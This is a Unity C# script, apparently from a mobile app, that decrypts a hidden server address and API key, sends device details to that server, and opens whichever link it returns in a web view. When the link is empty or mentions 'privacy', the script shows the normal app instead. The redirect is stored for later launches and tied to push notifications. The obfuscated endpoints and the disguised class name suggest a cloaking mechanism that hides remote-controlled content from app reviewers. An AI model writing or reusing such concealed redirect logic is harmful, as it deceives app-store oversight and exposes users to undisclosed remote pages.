using Newtonsoft.Json.Linq;
using OneSignalSDK;
using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

namespace Services
{
    public class NewVersionLinkLoader : MonoBehaviour
    {
        [SerializeField] private string m_Scheme; //Format
        [SerializeField] private string m_DomainName;
        [SerializeField] private string m_ApiKey;

        [Header("OS"), TextArea, SerializeField] private string m_OSScheme;

        [SerializeField] private string bundle;

        [Space, SerializeField] private GameObject root;
        [SerializeField] private Text logLable;

        [SerializeField] private bool m_ShowLogs;

        private const string SavedDataKey = "SavedKey";

        #region sec

        [ContextMenu("Encrypt in data")]
        private void EncryptIn() => CryptIn(true);

        [ContextMenu("Decrypt in data")]
        private void DecryptIn() => CryptIn(false);

        private void CryptIn(bool isEncrypt)
        {
            m_DomainName = StringCodeService.CryptSwitch(m_DomainName, bundle, isEncrypt);
            m_ApiKey = StringCodeService.CryptSwitch(m_ApiKey, bundle, isEncrypt);
            m_Scheme = StringCodeService.CryptSwitch(m_Scheme, bundle, isEncrypt);

            m_OSScheme = StringCodeService.CryptSwitch(m_OSScheme, bundle, isEncrypt);
        }

        #endregion

        class CpaObject
        {
            public string device_model;
        }

        private void Start()
        {
            OneSignal.Initialize("a77267c7-6bc1-4cc1-88c4-27098448dea7");

            if (Application.internetReachability == NetworkReachability.NotReachable)
            {
                PrintLog(Application.internetReachability.ToString());
                CancelLoad();
            }
            else
            {
                Initialize();
            }
        }

        private async Task Initialize()
        {
            var startLink = PlayerPrefs.GetString(SavedDataKey, "null");
            if (startLink == "null")
            {
                Task<string> response = Request(string.Format(
                    StringCodeService.Decrypt(m_Scheme, bundle),
                    StringCodeService.Decrypt(m_DomainName, bundle),
                    StringCodeService.Decrypt(m_ApiKey, bundle),
                    SystemInfo.deviceModel));

                await response;

                CheckResponse(response);
            }
            else
            {
                ViewFactory.Instance.CreateWView(startLink);
            }
        }

        private void CheckResponse(Task<string> response)
        {
            if (!response.IsFaulted)
            {
                var jsonObj = JObject.Parse(response.Result);

                if (jsonObj.ContainsKey("response"))
                {
                    var link = jsonObj.Property("response").Value.ToString();

                    if (string.IsNullOrEmpty(link))
                    {
                        PrintLog("NJI link is empty");
                        CancelLoad();
                    }
                    else if (link.Contains("privacy"))
                    {
                        CancelLoad();
                    }
                    else
                    {
                        ViewFactory.Instance.CreateWView(link);
                        StartCoroutine(DelieveOS(jsonObj.Property("client_id")?.Value.ToString()));
                    }
                }
                else
                {
                    CancelLoad();
                    PrintLog(response.Exception.ToString());
                }
            }
            else
            {
                PrintLog("NJI request fail");

                CancelLoad();
            }
        }

        IEnumerator DelieveOS(string _clientId)
        {
            yield return null;
            yield return new WaitWhile(() => string.IsNullOrEmpty(OneSignal.Default?.User?.OneSignalId));

            var os = Request(string.Format(
                StringCodeService.Decrypt(m_OSScheme, bundle),
                _clientId,
                OneSignal.Default?.User?.OneSignalId));

            PlayerPrefs.SetString(SavedDataKey, ViewFactory.Instance.CurrentUrl);
            PlayerPrefs.Save();
        }

        public async Task<string> Request(string url)
        {
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWebRequest.UserAgent = string.Join(", ", new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel });
            httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, Application.systemLanguage.ToString());
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            httpWebRequest.Timeout = 12000;

            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = JsonUtility.ToJson(new CpaObject
                {
                    device_model = SystemInfo.deviceModel,
                });
                streamWriter.Write(json);

                //JObject json = new JObject();
                //json.Add("device_model", SystemInfo.deviceModel);
                //streamWriter.Write(Newtonsoft.Json.JsonConvert.SerializeObject(json));
            }

            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                return await streamReader.ReadToEndAsync();
            }
        }

        private void CancelLoad()
        {
            if (PlayerPrefs.HasKey(SavedDataKey))
            {
                OneSignal.Notifications?.ClearAllNotifications();
                OneSignal.Logout();
            }

            root.SetActive(true);
            gameObject.SetActive(false);
        }


        private void PrintLog(string msg)
        {
            logLable.text += (msg + '\n');
        }

        [ContextMenu("Clear Prefs")]
        private void ClearPrefs() => PlayerPrefs.DeleteAll();
    }
}
